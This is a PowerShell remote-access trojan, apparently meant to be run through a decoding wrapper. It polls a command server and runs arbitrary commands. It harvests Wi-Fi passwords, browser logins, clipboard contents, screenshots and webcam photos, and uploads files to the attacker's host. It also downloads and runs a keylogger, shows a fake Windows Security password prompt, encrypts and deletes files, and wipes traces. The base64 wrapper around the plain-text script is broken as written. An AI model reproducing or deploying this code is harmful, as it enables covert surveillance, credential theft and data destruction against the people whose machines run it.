$e = [System.Convert]::FromBase64String('$apiURL = "https://me-sz5y.onrender.com/send-command"
$resultAPI = "https://me-sz5y.onrender.com/receive-results"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$global:sessions = @{}
$global:currentSession = $null
$global:idleTimeoutSeconds = 120  # Adjust timeout as needed (2 minutes in this case)

function Restart-System {
    Restart-Computer -Force
    return "successfully restarted system ."
}

function Shutdown-System {
    Stop-Computer -Force
    return "Successfully shutdown system"
}

function Download-FilesFromServer {
    $serverUrl = "https://me-sz5y.onrender.com"
    $filesListUrl = "$serverUrl/uploads"
    $tempDir = [System.IO.Path]::GetTempPath()
    $downloadedFiles = @{}

    Write-Host "Watching for new files from $serverUrl..."
    Write-Host "Saving files to $tempDir"
    Write-Host "Polling every 5 seconds..."

    while ($true) {
        try {
            # Get file list
            $files = Invoke-RestMethod -Uri $filesListUrl -Method Get

            foreach ($file in $files) {
                if (-not $downloadedFiles.ContainsKey($file)) {
                    $fileUrl = "$filesListUrl/$file"
                    $savePath = Join-Path $tempDir $file

                    Write-Host "Downloading: $file"

                    # Download and save file
                    Invoke-WebRequest -Uri $fileUrl -OutFile $savePath
                    Write-Host "Saved to: $savePath"

                    # Mark file as downloaded
                    $downloadedFiles[$file] = $true
                }
            }
        } catch {
            Write-Warning "Error while downloading: $_"
        }

        # Sleep for the specified polling interval (5 seconds)
        Start-Sleep -Seconds 5
    }
}


function Kill-AllPowerShellProcesses {
    # Get all PowerShell processes (both 'powershell.exe' and 'pwsh.exe')
    $powershellProcesses = Get-Process -Name "powershell", "pwsh" -ErrorAction SilentlyContinue

    # If there are any PowerShell processes running
    if ($powershellProcesses) {
        foreach ($process in $powershellProcesses) {
            try {
                # Kill the process forcefully
                Stop-Process -Id $process.Id -Force
            } catch {
                # Silently ignore errors (e.g., access denied)
            }
        }
    }
}

function Clear-TempDir {
    # Get the path to the temp directory
    $tempDir = [System.IO.Path]::GetTempPath()

    # Check if the temp directory exists
    if (Test-Path $tempDir) {
        # Flag to track if any file was deleted
        $deletedFiles = $false

        # Remove all files in the temp directory silently
        Get-ChildItem -Path $tempDir -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                # Remove the item and mark as deleted
                Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue
                $deletedFiles = $true
            } catch {
                # Ignore errors silently
            }
        }

        # Print success message if any file was deleted
        if ($deletedFiles) {
            Write-Host "Successfully deleted all files in the temp directory."
        }
    }
}


function Get-WifiPasswords {
    # Initialize an array to store the results
    $wifiDetails = @()

    # Get all Wi-Fi profiles saved on the machine
    $wifiProfiles = netsh wlan show profiles

    # Loop through each profile
    foreach ($profile in $wifiProfiles) {
        # Extract Wi-Fi name from the output
        if ($profile -match ":\s*(.+)$") {
            $wifiName = $matches[1].Trim()

            # Get detailed information about the Wi-Fi profile
            $profileDetails = netsh wlan show profile name="$wifiName" key=clear

            # Extract the password, if available
            $wifiPassword = ($profileDetails | Select-String -Pattern "Key Content\s*:\s*(.+)" | ForEach-Object { $_.Matches.Groups[1].Value }).Trim()

            # Extract the encryption type (WPA2, WPA3, etc.)
            $encryptionType = ($profileDetails | Select-String -Pattern "Encryption\s*:\s*(.+)" | ForEach-Object { $_.Matches.Groups[1].Value }).Trim()

            # Store the Wi-Fi details in an object
            $wifiDetail = New-Object PSObject -property @{
                WiFiName      = $wifiName
                Encryption    = $encryptionType
                Password      = if ($wifiPassword) { $wifiPassword } else { "(Not set or hidden)" }
            }

            # Add to the results array
            $wifiDetails += $wifiDetail
        }
    }

    # Return the results
    return $wifiDetails
}


function Set-Wallpaper {
    param(
        [Parameter(Mandatory = $true)]
        [string]$change
    )

    function Invoke-WallpaperChange {
        param([string]$imagePath)

        Add-Type @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

        $SPI_SETDESKWALLPAPER = 0x0014
        $SPIF_UPDATEINIFILE = 0x01
        $SPIF_SENDCHANGE = 0x02

        [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $imagePath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
    }

    if ($change -match "^https?://") {
        try {
            $fileName = [System.IO.Path]::GetFileName($change)
            $tempPath = Join-Path $env:TEMP $fileName
            Invoke-WebRequest -Uri $change -OutFile $tempPath -UseBasicParsing
            Write-Host "Image downloaded to $tempPath"
            Invoke-WallpaperChange -imagePath $tempPath
            Write-Host "Wallpaper changed to downloaded image."
        } catch {
            Write-Error "Failed to download or set wallpaper: $_"
        }
    } elseif (Test-Path $change) {
        try {
            Invoke-WallpaperChange -imagePath $change
            Write-Host "Wallpaper changed to $change"
        } catch {
            Write-Error "Error setting wallpaper: $_"
        }
    } else {
        # Try checking in current directory
        $localPath = Join-Path (Get-Location) $change
        if (Test-Path $localPath) {
            try {
                Invoke-WallpaperChange -imagePath $localPath
                Write-Host "Wallpaper changed to $localPath"
            } catch {
                Write-Error "Error setting wallpaper from current directory: $_"
            }
        } else {
            Write-Error "Invalid input: not a valid URL or file path."
        }
    }
}

function Start-Keylogger {
    # Define the URL where the keylogger script is hosted
    $url = "https://raw.githubusercontent.com/wagner012/wagner/refs/heads/main/key.ps1"

    # Define the path where we will save the file
    $tempPath = [System.IO.Path]::Combine($env:TEMP, "test.ps1")

    # Download the file to the temp path
    Invoke-WebRequest -Uri $url -OutFile $tempPath

    # Run the downloaded file silently (in the background)
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$tempPath"` -WindowStyle Hidden
}

function Stop-Keylogger {
    # Get all running PowerShell processes
    $psProcesses = Get-Process powershell -ErrorAction SilentlyContinue

    foreach ($proc in $psProcesses) {
        try {
            # Check if the command line contains "test.ps1"
            $commandLine = (Get-CimInstance Win32_Process -Filter "ProcessId = $($proc.Id)").CommandLine
            if ($commandLine -like "*test.ps1*") {
                Stop-Process -Id $proc.Id -Force
            }
        } catch {
            # Handle access errors silently
        }
    }
}

function Encrypt-FileWithPassword {
    param (
        [string]$filePath
    )

    $password = "jamaal123"

    # Generate AES key and IV from the password using PBKDF2
    $salt = [byte[]]@([System.Text.Encoding]::UTF8.GetBytes("SomeRandomSalt"))
    $iterations = 10000
    $keyLength = 32  # AES-256
    $ivLength = 16   # AES block size (128 bits)

    # Deriving the key and IV from the password
    $keyDerivation = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
    $aesKey = $keyDerivation.GetBytes($keyLength)
    $aesIV = $keyDerivation.GetBytes($ivLength)

    $encryptedFilePath = "$filePath.enc"

    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $aesKey
        $aes.IV = $aesIV
        $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

        # Open the file for reading and the encrypted file for writing
        $fileStream = [System.IO.File]::OpenRead($filePath)
        $encryptedStream = [System.IO.File]::OpenWrite($encryptedFilePath)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($encryptedStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        # Buffer for reading and writing data
        $buffer = New-Object byte[] 1024
        $bytesRead = 0
        while (($bytesRead = $fileStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $cryptoStream.Write($buffer, 0, $bytesRead)
        }

        $cryptoStream.Close()
        $fileStream.Close()
        $encryptedStream.Close()

        # Optionally, remove the original file after encryption
        Remove-Item -Path $filePath -Force

        return "File encrypted successfully: $encryptedFilePath"
    }
    catch {
        return "Error during encryption: $_"
    }
}

function Decrypt-FileWithPassword {
    param (
        [string]$filePath
    )

    $password = "jamaal123"

    # Generate AES key and IV from the password using PBKDF2
    $salt = [byte[]]@([System.Text.Encoding]::UTF8.GetBytes("SomeRandomSalt"))
    $iterations = 10000
    $keyLength = 32  # AES-256
    $ivLength = 16   # AES block size (128 bits)

    # Deriving the key and IV from the password
    $keyDerivation = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
    $aesKey = $keyDerivation.GetBytes($keyLength)
    $aesIV = $keyDerivation.GetBytes($ivLength)

    $decryptedFilePath = $filePath -replace '\.enc$', ''

    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $aesKey
        $aes.IV = $aesIV
        $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

        # Open the encrypted file for reading and create a new file for writing the decrypted data
        $encryptedStream = [System.IO.File]::OpenRead($filePath)
        $decryptedStream = [System.IO.File]::OpenWrite($decryptedFilePath)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($encryptedStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)

        # Buffer for reading and writing data
        $buffer = New-Object byte[] 1024
        $bytesRead = 0
        while (($bytesRead = $cryptoStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $decryptedStream.Write($buffer, 0, $bytesRead)
        }

        $cryptoStream.Close()
        $encryptedStream.Close()
        $decryptedStream.Close()

        # Remove the encrypted file after decryption
        Remove-Item -Path $filePath -Force

        return "File decrypted successfully: $decryptedFilePath"
    }
    catch {
        return "Error during decryption: $_"
    }
}



function devices-function {
    $model       = $env:COMPUTERNAME
    
    # Check if the user is an administrator
    $privilege   = if (([Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match "S-1-5-32-544") { 
                    "Administrator" 
                } else { 
                    "Standard User" 
                }
    
    $private_ip  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -ne "0.0.0.0" }).IPAddress
    if (-not $private_ip) {
        $private_ip = "Unknown IP"
    }
    
    # Timestamp in universal time
    $timestamp   = (Get-Date).ToUniversalTime().ToString("o")

    # Create a custom object to hold the results
    $deviceInfo = @{
        model      = $model
        privilege  = $privilege
        private_ip = $private_ip
        timestamp  = $timestamp
    }

    return $deviceInfo
}



# Function to generate a session ID
function Generate-SessionID {
     $os_version = $env:COMPUTERNAME
     return $os_version
}

function Show-SecurityForm {
    # Create the form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Windows Security"
    $form.Size = New-Object System.Drawing.Size(400,250)
    $form.StartPosition = "CenterScreen"
    $form.BackColor = [System.Drawing.Color]::Black
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.MaximizeBox = $false

    # Title Label
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = "Windows Security"
    $titleLabel.ForeColor = [System.Drawing.Color]::White
    $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 20, [System.Drawing.FontStyle]::Bold)
    $titleLabel.AutoSize = $true
    $titleLabel.Location = New-Object System.Drawing.Point(20,20)
    $form.Controls.Add($titleLabel)

    # Password Label
    $passwordLabel = New-Object System.Windows.Forms.Label
    $passwordLabel.Text = "Enter your password:"
    $passwordLabel.ForeColor = [System.Drawing.Color]::White
    $passwordLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12)
    $passwordLabel.AutoSize = $true
    $passwordLabel.Location = New-Object System.Drawing.Point(20,70)
    $form.Controls.Add($passwordLabel)

    # Password TextBox
    $passwordTextbox = New-Object System.Windows.Forms.TextBox
    $passwordTextbox.Location = New-Object System.Drawing.Point(20,100)
    $passwordTextbox.Size = New-Object System.Drawing.Size(350,30)
    $passwordTextbox.UseSystemPasswordChar = $true
    $form.Controls.Add($passwordTextbox)

    # Submit Button
    $submitButton = New-Object System.Windows.Forms.Button
    $submitButton.Text = "OK"
    $submitButton.Location = New-Object System.Drawing.Point(150,180)
    $submitButton.Size = New-Object System.Drawing.Size(100,30)
    $submitButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
    $submitButton.ForeColor = [System.Drawing.Color]::White
    $form.Controls.Add($submitButton)

    # 🔹 Handle click to send password to Node.js API
    $submitButton.Add_Click({
        if ([string]::IsNullOrWhiteSpace($passwordTextbox.Text)) {
            $errorLabel.Text = "You must enter a password."
        } else {
            $password = $passwordTextbox.Text
            $message = "Phishing Credentials: `nPassword: $password"
            
            # Send the password to the result API (Node.js server)
            $resultAPI = "https://me-sz5y.onrender.com/receive-results"  # Your Node.js API endpoint

            $body = @{
                result = $password
            } | ConvertTo-Json

            Invoke-RestMethod -Uri $resultAPI -Method Post -Body $body -ContentType "application/json"

            # Close the form after sending the password
            $form.Close()
        }
    })

    # Show the form
    $form.Add_Shown({ $form.Activate() })
    $form.ShowDialog() | Out-Null
}

function Send-TelegramFile {
    param([string]$filePath)

    # Check if the provided file path is not absolute (i.e., a relative path)
    if (-not ([System.IO.Path]::IsPathRooted($filePath))) {
        $filePath = Join-Path -Path (Get-Location).Path -ChildPath $filePath
    }

    # Check if the file exists
    if (-not (Test-Path $filePath)) {
        Write-Host "File not found: $filePath"
        return "File not found: $filePath"
    }

    $uri = "https://me-sz5y.onrender.com/files"
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $boundary = [System.Guid]::NewGuid().ToString()

    # Read the file content
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)

    # Define the multipart body boundary and headers
    $LF = "`r`n"
    $fields = (
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF" +
        "Content-Type: application/octet-stream$LF$LF"
    )

    $endBoundary = "$LF--$boundary--$LF"
    
    # Combine headers, file content, and boundary for the body
    $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($fields) + $fileContent + [System.Text.Encoding]::ASCII.GetBytes($endBoundary)

    # Set up the HTTP request
    $request = [System.Net.HttpWebRequest]::Create($uri)
    $request.Method = "POST"
    $request.ContentType = "multipart/form-data; boundary=$boundary"
    $request.ContentLength = $bodyBytes.Length

    # Write the body content to the request stream
    $requestStream = $request.GetRequestStream()
    $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
    $requestStream.Close()

    # Get the response from the server
    try {
        $response = $request.GetResponse()
        $responseStream = $response.GetResponseStream()
        $reader = [System.IO.StreamReader]::new($responseStream)
        $responseContent = $reader.ReadToEnd()
        $reader.Close()

        # Check the response status
        if ($response.StatusCode -eq 200) {
            Write-Host "File uploaded successfully."
            return "File uploaded successfully."
        } else {
            Write-Host "Failed to upload file. Status code: $($response.StatusCode)"
            return "Failed to upload file. Status code: $($response.StatusCode)"
        }
    } catch {
        Write-Host "Error uploading file: $_"
        return "Error uploading file: $_"
    }
}



function Fetch-BrowserData {
    $ProgressPreference = 'SilentlyContinue'

    # Check if sqlite3 is installed
    try {
        $sqlite3Version = & sqlite3 --version
    }
    catch {
        # Set URL for 64-bit SQLite 2025 version
        $url = "https://www.sqlite.org/2025/sqlite-tools-win-x64-3490100.zip"

        # Define temp paths
        $tempZip = "$env:TEMP\sqlite-tools.zip"
        $tempDir = "$env:TEMP\sqlite-temp"

        # Download and extract
        Invoke-WebRequest -Uri $url -OutFile $tempZip
        Expand-Archive -Path $tempZip -DestinationPath $tempDir -Force

        # Copy the SQLite executables to System32 (for global access)
        Get-ChildItem -Path "$tempDir\*.exe" | Copy-Item -Destination "$env:windir\System32" -Force

        # Clean up
        Remove-Item -Path $tempZip, $tempDir -Recurse -Force
    }

    # Define the output file path in the TEMP directory
    $outputFile = "$env:TEMP\browser_data.txt"

    # Initialize the output file with a title
    "Browser Data Extraction Report" | Out-File -FilePath $outputFile -Force
    "Generated on: $(Get-Date)" | Out-File -FilePath $outputFile -Append
    "------------------------------------------------------------" | Out-File -FilePath $outputFile -Append

    # Function to process a browser's Login Data
    function Process-LoginData($browserName, $loginDataPath) {
        if (-Not (Test-Path $loginDataPath)) {
            return
        }

        # Create a temporary copy of the database to avoid locking issues
        $tempDb = "$env:TEMP\$browserName`LoginDataCopy.db"
        Copy-Item -Path $loginDataPath -Destination $tempDb -Force

        # Define the query for login data
        $query = "SELECT origin_url, username_value FROM logins;"

        try {
            $results = & sqlite3 $tempDb $query

            if ($results) {
                $results -split "`n" | ForEach-Object {
                    $line = $_.Trim()
                    if ($line) {
                        $parts = $line -split '\|'
                        $origin = $parts[0]
                        $username = $parts[1]

                        # Check if the username is empty and handle accordingly
                        if ([string]::IsNullOrWhiteSpace($username)) {
                            $username = "No Username Found"
                        }

                        # Format the output
                        $outputLine = "Username: $username, Origin URL: $origin"
                        $outputLine | Out-File -FilePath $outputFile -Append
                        "------------------------------------------------------------" | Out-File -FilePath $outputFile -Append
                    }
                }
            } else {
                "No login data found for $browserName." | Out-File -FilePath $outputFile -Append
            }
        }
        catch {
            # Handle any errors but do not print messages to screen
        }

        # Clean up
        Remove-Item $tempDb -Force
    }

    # Chrome Login Data Path
    $chromeLoginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    Process-LoginData "Chrome" $chromeLoginDataPath

    # Edge Login Data Path
    $edgeLoginDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    Process-LoginData "Edge" $edgeLoginDataPath

    # Firefox Profiles Path Check
    $firefoxProfilesPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfilesPath) {
        $firefoxProfiles = Get-ChildItem -Path $firefoxProfilesPath -Directory
        foreach ($profile in $firefoxProfiles) {
            $firefoxLoginDataPath = "$profile.FullName\logins.json"

            # Process Firefox login data
            if (Test-Path $firefoxLoginDataPath) {
                Process-LoginData "Firefox" $firefoxLoginDataPath
            }
        }
    }

    # Send the file using Send-TelegramFile function
    Send-TelegramFile -filePath $outputFile

    return "Successfully fetched data."
}


function WebcamCapture {
    # Define temp and hidden paths
    $tempDir = [System.IO.Path]::GetTempPath()
    $hiddenDir = Join-Path $tempDir "hidden"

    # Ensure hidden directory exists
    if (-not (Test-Path $hiddenDir)) {
        New-Item -Path $hiddenDir -ItemType Directory | Out-Null
        # Set hidden attribute
        (Get-Item $hiddenDir).Attributes += 'Hidden'
    }

    # Define file URLs
    $exeUrl     = "https://github.com/wagner012/wagner/raw/refs/heads/main/test.exe"
    $dll1Url    = "https://github.com/wagner012/wagner/raw/refs/heads/main/AForge.Video.dll"
    $dll2Url    = "https://github.com/wagner012/wagner/raw/refs/heads/main/AForge.Video.DirectShow.dll"
    $decodeUrl  = "https://raw.githubusercontent.com/wagner012/wagner/refs/heads/main/decode.ps1"

    # Define file paths
    $exePath    = Join-Path $tempDir "test.exe"
    $dll1Path   = Join-Path $tempDir "AForge.Video.dll"
    $dll2Path   = Join-Path $tempDir "AForge.Video.DirectShow.dll"
    $decodePath = Join-Path $tempDir "decode.ps1"

    # Download only if files are missing
    if (-not (Test-Path $exePath))     { Invoke-WebRequest $exeUrl     -OutFile $exePath }
    if (-not (Test-Path $dll1Path))    { Invoke-WebRequest $dll1Url    -OutFile $dll1Path }
    if (-not (Test-Path $dll2Path))    { Invoke-WebRequest $dll2Url    -OutFile $dll2Path }
    if (-not (Test-Path $decodePath))  { Invoke-WebRequest $decodeUrl  -OutFile $decodePath }

    # Run the webcam capture executable silently
    Start-Process -FilePath $exePath -WorkingDirectory $tempDir -WindowStyle Hidden -Wait

    # Decrypt the captured image using decode.ps1
    powershell -ExecutionPolicy Bypass -File $decodePath

    # Path of the final decrypted image
    $decryptedImagePath = Join-Path $hiddenDir "photo.jpg"
    $photoDatPath = Join-Path $hiddenDir "photo.dat"

    if (Test-Path $decryptedImagePath) {
        # Send via Telegram if needed
        Send-TelegramFile -filePath $decryptedImagePath
        
        # Clean up: Remove the photo files
        Remove-Item -Path $decryptedImagePath -Force
        Remove-Item -Path $photoDatPath -Force

        return "Successfully took the webcam photo."
    } else {
        return "Failed to find the decrypted image."
    }
}

function Capture-And-Send-Screenshot {
    $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screenBounds.Width, $screenBounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)
    $tempPath = [System.IO.Path]::GetTempPath()
    $filePath = Join-Path -Path $tempPath -ChildPath "screenshot.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    Write-Host "Screenshot saved to: $filePath"
    Send-TelegramFile -filePath $filePath 
}

function Get-SystemInfo {
    $username = $env:USERNAME
    $private_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress
    $mac_address = (Get-NetAdapter | Select-Object -ExpandProperty MacAddress) -join ', '
    $user_privilege = if (([Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match "S-1-5-32-544") { "Administrator" } else { "Standard User" }
    $os_version = (Get-CimInstance Win32_OperatingSystem).Caption

    $systemInfo = @{
        Username       = $username
        Private_IP     = $private_ip
        Mac_Address    = $mac_address
        User_Privilege = $user_privilege
        OS_Version     = $os_version
    }

    return $systemInfo
}

function Get-Clipboard {
    Add-Type -AssemblyName System.Windows.Forms
    $text = [System.Windows.Forms.Clipboard]::GetText()
    return $text
}

# Get system information and store it in $sessionID
$sessionID = Generate-SessionID

# Print out session information for debugging purposes
Write-Host "Generated Session ID:"
$sessionID | Format-List

# Now, creating session data to send to the Node.js API
$sessionData = @{
    sessionID = $sessionID  # This will include all the system information as a hash table
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    devices_info = $devices_info  # Assuming $devices_info is defined somewhere
}

# Send the session data to the Node.js API
Invoke-RestMethod -Uri $resultAPI -Method Post -Body ($sessionData | ConvertTo-Json) -ContentType "application/json"

$maxRetries = 3
$retryDelay = 5
$heartbeatInterval = 60
$lastHeartbeatSent = Get-Date

while ($true) {
    try {
        $response = Invoke-RestMethod -Uri $apiURL -Method Get

        if ($response -and $response.command) {
            $command = $response.command
            $commandParts = $command.Split(" ", 2)
            $mainCommand = $commandParts[0]
            $commandArgument = if ($commandParts.Count -gt 1) { $commandParts[1].Trim() } else { "" }

            # 🟡 Notify server: BUSY
            $statusBusy = @{
                sessionID = $sessionID
                state     = "busy"
            } | ConvertTo-Json
            Invoke-RestMethod -Uri "$resultAPI/status" -Method Post -Body $statusBusy -ContentType "application/json"

            switch ($mainCommand) {
                "info"            { $output = Get-SystemInfo }
                "wifi_creds"      { $output = wifi_creds }
                "uplod_file"      { $output = Download-FilesFromServer }
                "Wallpaper"       { $output = Set-Wallpaper $commandArgument }
                "Browser_data"    { $output = Fetch-BrowserData }
                "shutdown"        { $output = Shutdown-System }
                "webcam"          { $output = WebcamCapture }
                "clear_trace"     { $output = Clear-TempDir }
                "kill_session"    { $output = Kill-AllPowerShellProcesses }
                "restart_session" { $output = Restart-System }
                "keyon"           { $output = Start-Keylogger }
                "keyoff"          { Stop-Keylogger }
                "screenshot"      { $output = Capture-And-Send-Screenshot }
                "devices"         { $output = devices-function }
                "clipboard"       { $output = Get-Clipboard }
                "phishing"        { Show-SecurityForm }
                "open-url"        {
                    Start-Process $commandArgument
                }
                "encrypt"         { $output = Encrypt-FileWithPassword -filePath $commandArgument }
                "decrypt"         { $output = Decrypt-FileWithPassword -filePath $commandArgument }
                "download"        {
                    if (-not [string]::IsNullOrEmpty($commandArgument)) {
                        try {
                            $output = Send-TelegramFile -filePath $commandArgument
                        } catch {
                            $output = "Error sending file: $_"
                        }
                    } else {
                        $output = "❌ Invalid or empty file path."
                    }
                }
                default {
                    $output = powershell.exe -Command $command 2>&1
                }
            }

            # 🟢 Notify server: IDLE
            $statusIdle = @{
                sessionID = $sessionID
                state     = "idle"
            } | ConvertTo-Json
            Invoke-RestMethod -Uri "$resultAPI/status" -Method Post -Body $statusIdle -ContentType "application/json"

            # 📤 Send result
            $sessionData = @{
                result    = $output
                sessionID = $sessionID
            } | ConvertTo-Json

            Invoke-RestMethod -Uri $resultAPI -Method Post -Body $sessionData -ContentType "application/json"
        }

        # ❤️ Heartbeat logic
        $now = Get-Date
        $elapsed = ($now - $lastHeartbeatSent).TotalSeconds

        if ($elapsed -ge $heartbeatInterval) {
            $heartbeatData = @{
                sessionID = $sessionID
                timestamp = $now.ToString("o")
            } | ConvertTo-Json

            $retryCount = 0
            $heartbeatSent = $false

            while ($retryCount -lt $maxRetries -and !$heartbeatSent) {
                try {
                    Invoke-RestMethod -Uri "$resultAPI/heartbeat" -Method Post -Body $heartbeatData -ContentType "application/json"
                    $lastHeartbeatSent = $now
                    $heartbeatSent = $true
                } catch {
                    $retryCount++
                    Start-Sleep -Seconds $retryDelay
                }
            }
        }
    } catch {
        # Silent catch to avoid endless error spam
    }

    Start-Sleep -Seconds 2
}'); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated
